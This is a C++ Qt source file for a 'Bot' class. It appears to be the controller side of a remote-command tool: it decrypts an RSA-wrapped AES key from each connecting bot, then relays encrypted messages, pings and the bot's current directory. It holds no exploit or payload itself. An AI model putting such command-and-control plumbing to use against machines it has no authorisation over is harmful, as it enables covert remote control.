#include "bot.h"

Bot::Bot(qintptr handle, RSA::PrivateKey *key, QObject *parent): QTcpSocket(parent), privateKey(key) {
    setSocketDescriptor(handle);
    QObject::connect(this, SIGNAL(disconnected()), this, SLOT(deleteLater()));

    ping = new QTimer(this);
    ping->setInterval(20000);
    ping->start();

    disconnectTimer = new QTimer(this);
    disconnectTimer->setInterval(30000);
    disconnectTimer->start();

    QObject::connect(ping, SIGNAL(timeout()), this, SLOT(timeToPing()));
    QObject::connect(disconnectTimer, SIGNAL(timeout()), this, SLOT(timeToDisconnect()));
    QTimer::singleShot(1000, this, SLOT(initAES()));
    initRSA();
}

Bot::~Bot() {
    emit deleteMe(this);
}

void Bot::initAES() {
    QByteArray data = readAll();
    data = QByteArray::fromBase64(data);

    if (data.size() != 512) {
        qDebug() << "Too strange";
        abort();
        return;
    }

    data = decryptRSA(data);

    if (data.size() != AES::DEFAULT_KEYLENGTH + AES::BLOCKSIZE) {
        qDebug() << "not a good bot";
        abort();
        return;
    }

    cfbEncryption = new CFB_Mode<AES>::Encryption((byte*)data.data(), AES::DEFAULT_KEYLENGTH, (byte*)data.data() + AES::DEFAULT_KEYLENGTH);
    cfbDecryption = new CFB_Mode<AES>::Decryption((byte*)data.data(), AES::DEFAULT_KEYLENGTH, (byte*)data.data() + AES::DEFAULT_KEYLENGTH);
    QObject::connect(this, SIGNAL(readyRead()), this, SLOT(readSomething()));

    safeWrite("vtyulb");
}

QByteArray Bot::encrypt(QByteArray data) {
    cfbEncryption->ProcessData((byte*)data.data(), (byte*)data.data(), data.size());
    return data.toBase64();
}

QByteArray Bot::decrypt(QByteArray data) {
    data = QByteArray::fromBase64(data);
    cfbDecryption->ProcessData((byte*)data.data(), (byte*)data.data(), data.size());
    return data;
}

void Bot::readSomething() {
    if (!canReadLine())
        return;

    ping->start();
    disconnectTimer->start();

    QByteArray array;
    while (canReadLine()) {
        QByteArray a = decrypt(readLine());
        if (a[0] == 'P') {
            disconnectTimer->start();
            if (array == "") {
                readSomething();
                return;
            }
        } else if (a[0] == 'D')
            currentDirectory = a.right(a.size() - 1);
        else if (a[0] == 'E') {
            if (array.size())
                emit dataAvailable(this, array);
            emit dataAvailable(this, QByteArray());
            return;
        } else {
            array += a.right(a.size() - 1);
        }

        if (!canReadLine())
            waitForReadyRead(500);
    }

    emit dataAvailable(this, array);
}

void Bot::safeWrite(QByteArray data) {
    writing.lock();
    write(encrypt(data));
    flush();
    writing.unlock();
}

QByteArray Bot::getCWD() {
    return currentDirectory.toUtf8();
}

void Bot::initRSA() {
    RSAdecryptor = new RSAES_OAEP_SHA_Decryptor(*privateKey);
}

QByteArray Bot::decryptRSA(QByteArray text) {
    string txt;
    for (int i = 0; i < text.size(); i++)
        txt.push_back(text[i]);

    string res;
    StringSource(txt, true,
        new PK_DecryptorFilter(rng, *RSAdecryptor,
            new StringSink(res)));

    return QByteArray(res.c_str(), res.size());
}

void Bot::timeToPing() {
    safeWrite("ping");
}

void Bot::timeToDisconnect() {
    abort();
}
